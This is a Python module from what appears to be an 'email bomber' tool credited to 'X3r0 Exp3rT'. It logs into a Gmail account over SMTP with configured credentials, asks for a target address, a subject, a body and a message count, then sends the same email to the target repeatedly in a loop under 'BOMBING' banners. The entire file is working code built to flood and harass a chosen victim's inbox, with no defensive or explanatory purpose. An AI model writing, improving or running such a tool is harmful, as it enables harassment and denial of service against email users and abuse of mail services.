import colors
import config
import time
import smtplib


def send_mail():
    #Taking User data
    print(f'{colors.HBGreen}[*] {colors.HBCyan}"modules.py" {colors.HBGreen}Successfully Loaded\n')
    time.sleep(1)
    print(f'{colors.HBGreen}[>] Programme Starting...\n')
    time.sleep(1)
    gmail = config.Gmail
    password = config.Password
    print(f'{colors.HBCyan}[|] Set {colors.HBRed}TARGET {colors.HBCyan}Mail')
    target_mail = input(f'{colors.HBCyan}[X3r0]-> ')
    print(f'{colors.HBCyan}[|] Set Mail {colors.HBRed}SUBJECT')
    subject = str(input(f'{colors.HBCyan}[X3r0]-> '))
    print(f'{colors.HBCyan}[|] Set Mail {colors.HBRed}BODY')
    body = str(input(f'{colors.HBCyan}[X3r0]-> '))
    print(f'{colors.HBCyan}[|] Set {colors.HBRed}AMOUNT {colors.HBCyan}of Mail')
    amount = int(input(f'{colors.HBCyan}[X3r0]-> '))
    formated_msg = f'Subject: {subject}\n\n{body}'
    print(f'\n{colors.HBGreen}[*] Initializing Data...\n')
    time.sleep(1.5)
    all_data = f'''{colors.HBYellow}TARGET EMAIL > {colors.HBRed}{target_mail}
{colors.HBYellow}SUBJECT > {colors.HBRed}{subject}
{colors.HBYellow}BODY > {colors.HBRed}{body}
{colors.HBYellow}AMOUNT OF MAIL > {colors.HBRed}{amount}
'''
    print(all_data)
    print(f'\n{colors.HBGreen}[*] Processing Programme...\n')
    time.sleep(1.5)
    print(f'\n{colors.HBRed}[~] BOMBING [~]\n')
    time.sleep(.5)
    print(f'{colors.HBYellow}[!] Do not Close...\n')
    #Using SMTP
    count = 0
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail, password)
    for email in range(amount):
        server.sendmail(gmail, target_mail, formated_msg)
        count += 1
        time.sleep(2)
    print(f'\n{colors.HBGreen}[!] BOMBING SUCCESSFUL [!]\n')
    time.sleep(1)
    print(f'\n{colors.HBCyan}[<] Author: X3r0 Exp3rT [>]\n')
    exit(0)
